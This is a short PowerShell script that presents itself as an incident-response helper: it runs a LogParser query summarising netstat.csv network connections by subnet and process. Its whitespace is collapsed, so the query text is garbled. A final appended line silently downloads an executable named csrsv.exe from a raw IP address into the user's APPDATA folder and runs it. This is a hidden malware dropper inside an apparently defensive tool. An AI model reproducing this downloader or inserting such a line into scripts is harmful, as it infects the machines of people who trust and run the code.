if (Get-Command logparser.exe) {$lpquery = @"SELECTCOUNT(Protocol,substr(ForeignAddress, 0, last_index_of(ForeignAddress, '.')),State,Component,Process) as Cnt,Protocol,substr(ForeignAddress, 0, last_index_of(ForeignAddress, '.')) as IP/24,State,Component,ProcessFROM*netstat.csvWHEREConPid not in ('0'; '4') andForeignAddress not like '10.%' andForeignAddress not like '169.254%' andForeignAddress not in ('*'; '0.0.0.0'; '127.0.0.1'; '[::]'; '[::1]')GROUP BYProtocol,IP/24,State,Component,ProcessORDER BYCnt, Process desc"@& logparser -stats:off -i:csv -dtlines:0 -rtp:-1 $lpquery} else {$ScriptName = [System.IO.Path]::GetFileName($MyInvocation.ScriptName)"${ScriptName} requires logparser.exe in the path."}(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")